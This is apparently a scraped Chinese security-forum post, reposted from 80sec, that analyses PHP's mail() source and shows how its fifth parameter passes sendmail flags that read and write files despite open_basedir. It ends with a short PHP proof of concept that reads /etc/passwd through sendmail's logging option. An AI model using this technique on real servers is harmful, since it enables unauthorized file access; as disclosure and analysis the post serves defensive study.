@@ -1,0 +1,124 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+php mail function open_basedir bypass
+D8888D主贴内容-------------------------------------------------------
+来源：80sec
+
+漏洞介绍：php是一款被广泛使用的编程语言，可以被嵌套在html里用做web程 序开发，但是80sec发现在php的Mail函数设计上存在问题，可能导致绕过其他的如open_basedir等限制以httpd进程的身份读写任意 文件，结合应用程序上下文也可能导致文件读写漏洞。
+漏洞分析：php的Mail函数在php源码里以如下形式实现： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01...... 
+
+02if (PG(safe_mode) && (ZEND_NUM_ARGS() == 5)) { 
+
+03php_error_docref(NULL TSRMLS_CC, E_WARNING, "SAFE MODE Restriction in effect. The fifth parameter is disabled in SAFE MODE."); 
+
+04RETURN_FALSE; 
+
+05} 
+
+06  
+
+07if (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, "sss|ss", 
+
+08&to, &to_len, 
+
+09&subject, &subject_len, 
+
+10&message, &message_len, 
+
+11&headers, &headers_len, 
+
+12&extra_cmd, &extra_cmd_len 
+
+13) == FAILURE) { 
+
+14return; 
+
+15} 
+
+16...... 
+
+17  
+
+18if (force_extra_parameters) { 
+
+19extra_cmd = estrdup(force_extra_parameters); 
+
+20} else if (extra_cmd) { 
+
+21extra_cmd = php_escape_shell_cmd(extra_cmd); 
+
+22} 
+
+23  
+
+24if (php_mail(to_r, subject_r, message, headers, extra_cmd TSRMLS_CC)) { 
+
+25RETVAL_TRUE; 
+
+26} else { 
+
+27RETVAL_FALSE; 
+
+28} 
+
+29.....
+在php_mail中 [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]01PHPAPI int php_mail(char *to, char *subject, char *message, char *headers, char *extra_cmd TSRMLS_DC) 
+
+02{ 
+
+03.... 
+
+04FILE *sendmail; 
+
+05int ret; 
+
+06char *sendmail_path = INI_STR("sendmail_path"); 
+
+07char *sendmail_cmd = NULL; 
+
+08  
+
+09.... 
+
+10if (extra_cmd != NULL) { 
+
+11sendmail_cmd = emalloc (strlen (sendmail_path) + strlen (extra_cmd) + 2); 
+
+12strcpy (sendmail_cmd, sendmail_path); 
+
+13strcat (sendmail_cmd, " "); 
+
+14strcat (sendmail_cmd, extra_cmd); 
+
+15} else { 
+
+16sendmail_cmd = sendmail_path; 
+
+17} 
+
+18.... 
+
+19/* Since popen() doesn't indicate if the internal fork() doesn't work 
+
+20* (e.g. the shell can't be executed) we explicitely set it to 0 to be 
+
+21* sure we don't catch any older errno value. */
+
+22errno = 0; 
+
+23sendmail = popen(sendmail_cmd, "w");
+如果是Linux系统，Mail函数将拼接INI_STR(”sendmail_path”)的内容和额外的参数来执行命令，但是额外的参数在拼接之前经 过php_escape_shell_cmd的处理，所以我们无法执行额外的命令。但是通过查阅sendmail自身的命令帮助，我们可以发现 sendmail的某些参数是可以用来读写文件的，利用这个特性如果我们控制第5个参数的时候我们一样可以获得对文件系统的读写权限并且不受 open_basedir等限制。
+
+漏洞测试： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]1<?php 
+
+2$to      = 'jianxin@80sec.com'.str_repeat("x",10000); 
+
+3$subject = 'the subject'.str_repeat("x",10); 
+
+4$message = 'hello'.str_repeat("x",10); 
+
+5mail($to, $subject, $message, $headers,"-v -bt -X /tmp/80sec -d13 -C /etc/ passwd"); 
+
+6?>
+
